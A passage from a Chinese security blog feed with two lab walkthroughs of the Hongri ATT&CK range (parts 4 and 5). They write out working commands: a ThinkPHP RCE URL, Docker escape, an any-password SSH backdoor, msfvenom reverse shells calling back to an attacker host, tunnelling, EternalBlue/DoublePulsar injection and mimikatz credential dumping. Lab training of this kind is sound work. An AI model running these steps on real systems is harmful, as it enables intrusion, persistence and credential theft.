<p>动态规划算法是通过拆分问题，定义问题状态和状态之间的关系，使得问题能够以递推（或者说分治）的方式去解决。</p>
]]></content>
      <categories>
        <category>-readbook</category>
      </categories>
  </entry>
  <entry>
    <title>红日靶场4</title>
    <url>/2022/10/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/</url>
    <content><![CDATA[<h1 id="红日靶场4"><a href="#红日靶场4" class="headerlink" title="红日靶场4"></a>红日靶场4</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">说实话也好久没有打靶场了，这次也来继续打红日靶场过下瘾，因为前段时间一直在研究免杀。</span><br></pre></td></tr></table></figure>

<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><a href="https://www.bilibili.com/video/av560317166/">红日ATT＆CK系列靶场（四）搭建_哔哩哔哩_bilibili</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ubuntu:ubuntu域成员机器</span><br><span class="line">douser:Dotest123</span><br><span class="line">DC:administrator:Test2008 ——&gt;123qwe!@#</span><br><span class="line"></span><br><span class="line">利用自定义来实现两个网段</span><br><span class="line">web：192.168.183.133  192.168.100.145 </span><br><span class="line">域成员：192.168.183.129</span><br><span class="line">域控：192.168.183.130</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">大家好红日安全红队靶场（四）已经出来，本次靶场渗透反序列化漏洞、命令执行漏洞、Tomcat漏洞、MS系列漏洞、端口转发漏洞、以及域渗透等多种组合漏洞。</span><br><span class="line">靶场学习路径，可参考</span><br><span class="line">    strusts漏洞利用</span><br><span class="line">    phpmyadmin getshell</span><br><span class="line">    tomcat 漏洞利用</span><br><span class="line">    docker逃逸</span><br><span class="line">    ms14-068</span><br><span class="line">    ssh密钥利用</span><br><span class="line">    流量转发</span><br><span class="line">    历史命令信息泄露</span><br><span class="line">    域渗透</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>web的docker打开</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/ubuntu/Desktop/vulhub/struts2/s2-045</span><br><span class="line"></span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"></span><br><span class="line">cd /home/ubuntu/Desktop/vulhub/tomcat/CVE-2017-12615/</span><br><span class="line"></span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"></span><br><span class="line">cd /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-2018-12613/</span><br><span class="line"></span><br><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>win7不知道烦什么毛病啊</p>
<h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>192.168.157.128</p>
<p>这个是目标地址，首先我们扫一扫端口，根据官方的提示应该是有三种方式拿下shell的，<code>strusts</code>漏洞利用<br>，<code>phpmyadmin</code> <code>getshel</code>l，<code>tomcat</code> 漏洞利用</p>
<p><img src="/2022/10/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20221018140821496.png" alt="image-20221018140821496"></p>
<p>分别对应了<code>strusts</code>漏洞利用，<code>phpmyadmin</code> <code>getshel</code>l，<code>tomcat</code> 漏洞利用。</p>
<p>第一个structs我直接用的工具啊（后面我会专门写文章从与原理分析</p>
<p><img src="/2022/10/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20221018141250527.png" alt="image-20221018141250527"></p>
<p>Tomcat任意文件上传漏洞</p>
<p><img src="/2022/10/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20221018141704684.png" alt="image-20221018141704684"></p>
<p><img src="/2022/10/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20221018141731988.png" alt="image-20221018141731988"></p>
<p>phpmyadmin我就不用说了吧，我写的有博客 <a href="https://wanheiqiyihu.top/2022/06/02/phpmyadmin%E5%90%8E%E5%8F%B0%E6%8B%BFshell%E7%9A%844%E7%A7%8D%E6%96%B9%E5%BC%8F/">phpmyadmin后台拿shell的4种方式 | 十三の博客 (wanheiqiyihu.top)</a></p>
<h2 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先查看是否是在docker环境中</span><br><span class="line">我这里找了网上的三种方法：</span><br><span class="line">方式一：检查/.dockerenv文件是否存在</span><br><span class="line">ls -al /</span><br><span class="line"></span><br><span class="line">方式二：检查是否存在container环境变量(感觉不是很靠谱)</span><br><span class="line">env</span><br><span class="line">export</span><br><span class="line"></span><br><span class="line">方式三：检查/proc/1/cgroup内是否包含&quot;docker&quot;等字符串</span><br><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure>

<p><img src="/2022/10/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20221018143121636.png" alt="image-20221018143121636"></p>
<p><img src="/2022/10/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20221018143214298.png" alt="image-20221018143214298"></p>
<p>确定当前为docker环境，进行docker逃逸。</p>
<p>这是我第一次接触docker逃逸，这里就想跟着大佬做，后面出文章总结一下docker逃逸的原理和方法（挖坑）。</p>
<h3 id="利用特权模式逃逸"><a href="#利用特权模式逃逸" class="headerlink" title="利用特权模式逃逸"></a>利用特权模式逃逸</h3><p>如果是通过特权模式启动容器，就可以获得大量设备文件的访问权限，因为管理员执行<code>docker run —privileged</code>时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。</p>
<p>创建一个文件夹，将宿主机根目录挂载至容器目录下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fdisk -l   #linux中通过fdisk -l 查看机器所挂硬盘个数及分区情况</span><br><span class="line">mkdir /wpsec</span><br><span class="line">mount /dev/sda1 /wpsec</span><br></pre></td></tr></table></figure>

<p>进入这个创建的文件夹，发现可以修改其中的内容，在相同版本的ubuntu创建一个root权限的用户，然后复制进去。当然也要改shadow</p>
<p><a href="https://blog.csdn.net/mengfanfan1/article/details/123921435">(111条消息) 记录ubuntu建立新用户并赋予root权限_早睡早起不偷懒！的博客-CSDN博客_ubuntu创建用户并赋予权限</a></p>
<p>然后就ssh连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh wanheiqiyihu@192.168.157.128</span><br></pre></td></tr></table></figure>

<p>这里我们把ubuntu也弄成root权限，这样才能设置root的密码</p>
<p><img src="/2022/10/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20221018154456136.png" alt="image-20221018154456136"></p>
<p>提权</p>
<p><img src="/2022/10/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20221018154503663.png" alt="image-20221018154503663"></p>
<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>用ssh软连接后面进行权限维持</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oport=12345</span><br></pre></td></tr></table></figure>

<p>要连接的时候</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.100.145 -p 12345</span><br></pre></td></tr></table></figure>

<p>任意密码登录</p>
<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>生成一个木马文件，然后上线msf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.100.129 LPORT=9995 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

<p>开始监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set lhost</span><br><span class="line">set lport</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>有点慢啊，弄得我都怀疑是命令哪里出错了，结果是之前环境错了，连不了外网，我把另一个网卡改成nat模式了。</p>
<p>这样就可以连接了</p>
<p><img src="/2022/10/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20221018160555552.png" alt="image-20221018160555552"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run get_local_subnets</span><br><span class="line">拿到网段</span><br></pre></td></tr></table></figure>

<p><img src="/2022/10/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20221018172820577.png" alt="image-20221018172820577"></p>
<p>配置转发</p>
<p><code>run autoroute -s 192.168.183.0/24</code></p>
<h2 id="socks代理"><a href="#socks代理" class="headerlink" title="socks代理"></a>socks代理</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 127.0.0.1</span><br><span class="line">set version 5</span><br><span class="line">set srvport 3333</span><br></pre></td></tr></table></figure>

<p><img src="/2022/10/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20221018181409165.png" alt="image-20221018181409165"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/proxychains.conf</span><br></pre></td></tr></table></figure>

<p>修改好</p>
<p><img src="/2022/10/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20221018180641370.png" alt="image-20221018180641370"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains msfconsole </span><br></pre></td></tr></table></figure>

<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p>在ubuntu上弄个fscan</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./fscan_amd64 -h 192.168.183.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/2022/10/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20221018173637502.png" alt="image-20221018173637502"></p>
<p>两个ms17-010</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search ms17_010</span><br><span class="line">use 2 </span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set rhosts 192.168.183.130</span><br></pre></td></tr></table></figure>

<p>额，给打蓝屏了还是没利用成功？（不愧是永恒之蓝？</p>
<p><img src="/2022/10/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20221018184853720.png" alt="image-20221018184853720"></p>
<p><img src="/2022/10/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20221018185022560.png" alt="image-20221018185022560"></p>
<p>这环境也太不稳了。</p>
<p>暂时这样吧，后面单独复现永恒之蓝，电脑要卡死了。</p>
<p>后面就是永恒之蓝，然后MS14-068抓密码</p>
]]></content>
      <categories>
        <category>-bachang</category>
      </categories>
  </entry>
  <entry>
    <title>红日靶场5</title>
    <url>/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/</url>
    <content><![CDATA[<h1 id="红日靶场5"><a href="#红日靶场5" class="headerlink" title="红日靶场5"></a>红日靶场5</h1><p>好久没玩红日的靶场了，来过下瘾。</p>
<p>还是先去他们官网下载下来，这次只有两个机器，简单拿下好吧</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">装好机器后，第一次登录会要求你更改密码</span><br><span class="line"></span><br><span class="line">2008dc  hongri2020@(因为聊天搞忘了，想了半天)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">win7账号密码：</span><br><span class="line"></span><br><span class="line">sun\heart 123.com</span><br><span class="line"></span><br><span class="line">sun\Administrator dc123.com</span><br></pre></td></tr></table></figure>

<p>喜欢我靶场吗🤗🤗</p>
<p>下面是网卡环境，外网主机采用nat模式，内网网断采用lan网断模拟内网环境。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2008dc  192.168.138.138</span><br><span class="line"></span><br><span class="line">win7</span><br><span class="line">192.168.138.136</span><br><span class="line">192.168.32.107</span><br></pre></td></tr></table></figure>

<p>这里其实有个坑，win7机器，自动设置了ip网段是135的，我们需要给他从网络属性中改成自动获取ip地址。这样nat模式就会和物理机处于同一个网断了。</p>
<p>现在机器和网络环境搭建好之后，记得开启win7上面的phpstudy，傻瓜式一键开启。😋</p>
<p>这里我放一下官方的红队思路啊，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一、环境搭建</span><br><span class="line">1.环境搭建测试</span><br><span class="line">2.信息收集</span><br><span class="line">二、漏洞利用</span><br><span class="line">3.漏洞搜索与利用</span><br><span class="line">4.漏洞利用Getshell</span><br><span class="line">5.系统信息收集</span><br><span class="line">6.主机密码收集</span><br><span class="line">三、内网搜集</span><br><span class="line">7.内网--继续信息收集</span><br><span class="line">8.内网攻击姿势--MS14-058</span><br><span class="line">9.内网攻击姿势--MS17-010</span><br><span class="line">四、横向移动</span><br><span class="line">10.psexec远控</span><br><span class="line">11.内网其它主机端口</span><br><span class="line">12.netsh增删防火墙规则</span><br><span class="line">五、构建通道</span><br><span class="line">13.内网其它主机端口-代理转发</span><br><span class="line">六、持久控制</span><br><span class="line">14.域渗透-域成员信息收集</span><br><span class="line">15.域渗透-基础服务弱口令探测及深度利用之powershell</span><br><span class="line">16.域渗透-横向移动[wmi利用]</span><br><span class="line">17.域渗透-域控实现与利用</span><br><span class="line">七、痕迹清理</span><br><span class="line">18、日志清理</span><br></pre></td></tr></table></figure>

<h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>现在我们访问目标网址</p>
<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205135506911.png" alt="image-20230205135506911"></p>
<p>thinkphp v5，我们去搜索一下历史漏洞即可</p>
<p>下面是我找到的漏洞🥰</p>
<p><a href="https://blog.csdn.net/qq_62046696/article/details/127134892">(148条消息) ThinkPHP V5（漏洞解析及利用）及tornado知识点_偶尔躲躲乌云334的博客-CSDN博客_thinkphp v5</a></p>
<p>程序未对控制器进行过滤，导致攻击者可以用 \（斜杠）调用任意类方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.32.107/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>

<p>这是poc，复现成功，成功执行命令，那我们直接准备拿下web机器的权限。</p>
<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205135822480.png" alt="image-20230205135822480"></p>
<p>这时候就是准备cs上线咯！</p>
<p>用</p>
<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205140635063.png" alt="image-20230205140635063"></p>
<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205141257606.png" alt="image-20230205141257606"></p>
<p>选择powershell，成功上线。</p>
<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>上线之后呢，首先要做的肯定就是一个信息手机啦</p>
<p>我们这用巨龙拉登插件算了</p>
<p>先看看目标主机的内外网ip地址</p>
<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205141908668.png" alt="image-20230205141908668"></p>
<p>管理员权限（后面有个真是外网地址我就不放了，那是我物理机的地址，因为我们知道这个环境是两个内网网段搭建的，我们就默认为32这个网段是外网。）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">内外网ip地址</span><br><span class="line">192.168.138.136（内网）</span><br><span class="line">192.168.32.107</span><br></pre></td></tr></table></figure>

<p>现在我们知道了内网的网段，直接对这个网断的存活机器进行一个探测，当然用arp -a也可以试试</p>
<p>可以看到</p>
<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205142223758.png" alt="image-20230205142223758"></p>
<p>138网段，只有额外的138.138机器。我们下面在用工具探测一下。</p>
<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205142834986.png" alt="image-20230205142834986"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load OnlinePC</span><br><span class="line">192.168.138.1/c is not a Valid CIDR</span><br><span class="line"></span><br><span class="line">C_Segment: 192.168.138.</span><br><span class="line">=============================================</span><br><span class="line">ICMP: 192.168.138.136	00-0C-29-CE-6E-01	win7.sun.com   	VMware</span><br><span class="line">ICMP: 192.168.138.138	00-0C-29-34-B5-08	               	VMware</span><br><span class="line"> MAC: 192.168.138.255	00-0C-29-CE-6E-01	               	VMware</span><br><span class="line">=============================================</span><br><span class="line">OnlinePC:3</span><br><span class="line">IP/24 Finished!</span><br><span class="line">End: 2023-02-05 14:29:07</span><br></pre></td></tr></table></figure>

<p>成功扫到，还是这两台机器。</p>
<p>那么就只有192.168.138.138需要我们去拿下。</p>
<p>但还是弄一下基础的一些信息收集为好</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell net group &quot;domain controllers&quot; /domain  查看域控</span><br><span class="line">拒绝访问（你很好）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell hostname   查看主机名</span><br><span class="line">win7</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell net config Workstation   查看当前登录域和用户信息</span><br><span class="line">计算机名                     \\WIN7</span><br><span class="line">计算机全名                   win7.sun.com</span><br><span class="line">用户名                       Administrator</span><br><span class="line"></span><br><span class="line">工作站正运行于               </span><br><span class="line">	NetBT_Tcpip_&#123;522E987F-D8BB-4F8D-BD80-6B57C75E348D&#125; (000C29CE6E01)</span><br><span class="line">	NetBT_Tcpip_&#123;4660F312-0A34-48C8-B979-938D6645032D&#125; (000C29CE6EF7)</span><br><span class="line"></span><br><span class="line">软件版本                     Windows 7 Professional</span><br><span class="line"></span><br><span class="line">工作站域                     SUN</span><br><span class="line">工作站域 DNS 名称            sun.com</span><br><span class="line">登录域                       SUN</span><br><span class="line"></span><br><span class="line">COM 打开超时 (秒)            0</span><br><span class="line">COM 发送计数 (字节)          16</span><br><span class="line">COM 发送超时 (毫秒)          250</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>

<p>在一个名为SUN的域中。</p>
<p>我记得直接ping dc或许会拿到域控</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell ping dc</span><br><span class="line">[*] Tasked beacon to run: ping dc</span><br><span class="line">[+] host called home, sent: 38 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">正在 Ping dc.sun.com [192.168.138.138] 具有 32 字节的数据:</span><br></pre></td></tr></table></figure>

<p>现在基本可以确定那台138的机器就是域控。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当然也可以使用nslookup SUN.com</span><br><span class="line">来确认域控，结果如下</span><br><span class="line"></span><br><span class="line">beacon&gt; shell nslookup SUN.com</span><br><span class="line">[*] Tasked beacon to run: nslookup SUN.com</span><br><span class="line">[+] host called home, sent: 47 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">DNS request timed out.</span><br><span class="line">    timeout was 2 seconds.</span><br><span class="line">服务器:  UnKnown</span><br><span class="line">Address:  192.168.138.138（这个就是域控了）</span><br><span class="line"></span><br><span class="line">名称:    SUN.com</span><br><span class="line">Address:  192.168.138.138</span><br></pre></td></tr></table></figure>

<p>然后用猕猴桃也可以抓到本机的明文密码</p>
<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205172052680.png" alt="image-20230205172052680"></p>
<h2 id="横向"><a href="#横向" class="headerlink" title="横向"></a>横向</h2><p>现在信息收集完了，我们准备拿下域控。直接上内网大杀器，fscan上场!</p>
<p>先用cs上传上去</p>
<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205160359591.png" alt="image-20230205160359591"></p>
<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205160408104.png" alt="image-20230205160408104"></p>
<p>上传上去之后，直接使用fscan开始</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell C:\fscan64.exe -h 192.168.138.138</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205164407138.png" alt="image-20230205164407138"></p>
<p>ms17-010，这不一把嗦?😋</p>
<p>这边我们就用msf和cs联动一下吧，要拿ms17-010是要msf使用的。</p>
<p>（以前我还没玩过联动呢）</p>
<p><a href="https://blog.csdn.net/qi_SJQ_/article/details/122988526">(148条消息) 内网安全学习(八)—CS&amp;MSF联动_暮w光的博客-CSDN博客_cs和msf联动</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CS-&gt;MSF：</span><br><span class="line">创建Foreign监听器</span><br><span class="line">MSF监听模块设置对应端口地址</span><br><span class="line">CS执行Spawn选择监听器</span><br><span class="line"></span><br><span class="line">MSF-&gt;CS：</span><br><span class="line">CS创建监听器</span><br><span class="line">MSF载入新模块注入设置对应地址端口</span><br><span class="line">执行CS等待上线</span><br><span class="line">use exploit/windows/local/payload_inject</span><br></pre></td></tr></table></figure>

<p>那我们就联动一下</p>
<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205174356762.png" alt="image-20230205174356762"></p>
<p>这里填写kali的ip</p>
<p>msf开启之后，协议和ip和端口都需要和cs一样才行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">set lport 4444</span><br><span class="line"></span><br><span class="line">set lhost 192.168.32.108</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205174829633.png" alt="image-20230205174829633"></p>
<p>成功反弹到msf上面，现在就是设置一下路由，然后ms17010一把嗦</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下面是msf的命令</span><br><span class="line"></span><br><span class="line">#获取当前主机下的网络架构分布</span><br><span class="line">run get_local_subnets</span><br><span class="line"></span><br><span class="line">添加路由访问</span><br><span class="line">run autoroute -s 192.168.138.0/24</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205185404763.png" alt="image-20230205185404763"></p>
<p>随后在kali上执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nohup ./ew_for_linux64 -s rcsocks -l 8888 -e 6666</span><br><span class="line"></span><br><span class="line">#侦听6666端口，提供socks代理 并且将6666的代理发送到8888端口，此时也侦听8888端口，等待反弹连接</span><br><span class="line"></span><br><span class="line">通过cs把ew上传到win7上，win7连接kali</span><br><span class="line">shell C:\ew_for_win_32.exe -s rssocks -d 192.168.32.108 -e 6666</span><br></pre></td></tr></table></figure>

<p>隧道搭建成功，然后我们就准备利用ms17010</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use  auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">set  rhosts 192.168.138.138</span><br><span class="line">set  threads 3</span><br><span class="line">这里确实是成功检测到了漏洞的，也就是说明，我们的隧道确实是搭建成功了的。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"></span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">set rhost 192.168.138.138</span><br><span class="line"></span><br><span class="line">set lhost 192.168.138.136 #设置为跳板机</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205191326846.png" alt="image-20230205191326846"></p>
<p>但是报错了啊。我服了什么都能报错</p>
<p>所以受不了了，我决定上todesk</p>
<p>传上去之后，shell  C:\Users\leo\Desktop\123.exe</p>
<p>然后C:\ProgramData\ToDesk_Lite路径下会有todesk的一个config文件</p>
<p>将其下载下来，看着两个参数</p>
<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205194522338.png" alt="image-20230205194522338"></p>
<p>把tempAuthPassEx的值复制出来，替换掉本机todesk配置文件中原来的tempAuthPassEx值</p>
<p>重启todesk获取服务器的验证码</p>
<p>很好，很好，很好，新版本没有这个功能了。很好，被修复了，非常好。我搞这个内网穿透要弄了一万年了。我真的谢谢，frp，ew，我都试过了。很好，很好。😅🤗</p>
<h2 id="峰会路转之原生ms17010工具🥰"><a href="#峰会路转之原生ms17010工具🥰" class="headerlink" title="峰会路转之原生ms17010工具🥰"></a>峰会路转之原生ms17010工具🥰</h2><p>针对入口跳板机已经CS上线但是因为目标所在区域代理出来的流量卡慢、扫描会导致代理隧道崩溃、<a href="https://so.csdn.net/so/search?q=MSF&spm=1001.2101.3001.7020">MSF</a>的17010不成功但是原生利用工具成功的场景。此工具是由最原版调用fb.py那版提取出来的(原生版是最为稳定，并且能利用的版本)。</p>
<p>项目地址：<a href="https://github.com/TolgaSEZER/EternalPulse">https://github.com/TolgaSEZER/EternalPulse</a></p>
<p>下面进行使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.32.108 LPORT=4443 -f dll &gt; x64.dll</span><br></pre></td></tr></table></figure>

<p>这里的lhost就填写kali本机就可以了</p>
<p>将dll文件拷贝到EternalPulse工具目录下打包成zip，上传到cobaltstrike已控机器中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看目标主机是否安装解压缩软件。</span><br><span class="line">shell dir “C:\Program Files”</span><br><span class="line"></span><br><span class="line">解压缩工具包。</span><br><span class="line">shell “C:\Program Files\7-Zip\7z.exe” x EternalPulse.zip -oc:\EternalPulse</span><br><span class="line">或WinRAR:</span><br><span class="line">“C:\Program Files\WinRAR\rar.exe” x c:\test\EternalPulse.rar c:\test</span><br><span class="line"></span><br><span class="line">如果没有解压缩工具，给主机上传单个的rar.exe或7z.exe也可。</span><br></pre></td></tr></table></figure>

<p>进入到解压缩后的工具目录。</p>
<p>进不去直接执行命令也可以</p>
<p><code>Eternalblue-2.2.0.exe --InConfig Eternalblue-2.2.0.xml --TargetIp 存在17010漏洞的IP --TargetPort 445 --Target WIN72K8R2</code></p>
<p>但是记得msf开启监听哦</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler </span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.32.108</span><br><span class="line">set lport 4443</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>

<p>执行Doublepulsar-1.3.1.exe工具远程执行后门</p>
<p><code>Doublepulsar-1.3.1.exe --InConfig Doublepulsar-1.3.1.xml --TargetIp 存在17010漏洞的IP --TargetPort 445 --Protocol SMB --Architecture x64 --Function RunDLL --DllPayload x64.dll --payloadDllOrdinal 1 --ProcessName lsass.exe --ProcessCommandLine &quot;&quot; --NetworkTimeout 60</code></p>
<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230205224645712.png" alt="image-20230205224645712"></p>
<p>成功报错，msf也没有收到session</p>
<p>随后我找了下报错原因</p>
<p><a href="https://www.secpulse.com/archives/195218.html">解决win7嵌入式系统无法DoublePulsar问题 - SecPulse.COM | 安全脉搏</a></p>
<p>成功解决问题，但是还是没有收到反弹shell。我要疯掉了，为什么到我这什么东西都疯狂报错啊？没有重装电脑前都好好的是吧。😊</p>
<h2 id="获得明文密码直接"><a href="#获得明文密码直接" class="headerlink" title="获得明文密码直接"></a>获得明文密码直接</h2><p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230211234252037.png" alt="image-20230211234252037"></p>
<p>之前我们用猕猴桃抓到了域用户的账号密码，直接psexec64登录就可以了</p>
<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230211234524943.png" alt="image-20230211234524943"></p>
<p>这里dc直接上线。内网靶场其实还是很好玩的。我还有很多需要学习的，加油！</p>
]]></content>
      <categories>
        <category>-bachang</category>
      </categories>
  </entry>
  <entry>
    <title>红队隐蔽 whonix+vmware</title>
    <url>/2023/07/27/%E7%BA%A2%E9%98%9F%E9%9A%90%E8%94%BD-whonix-vmware/</url>
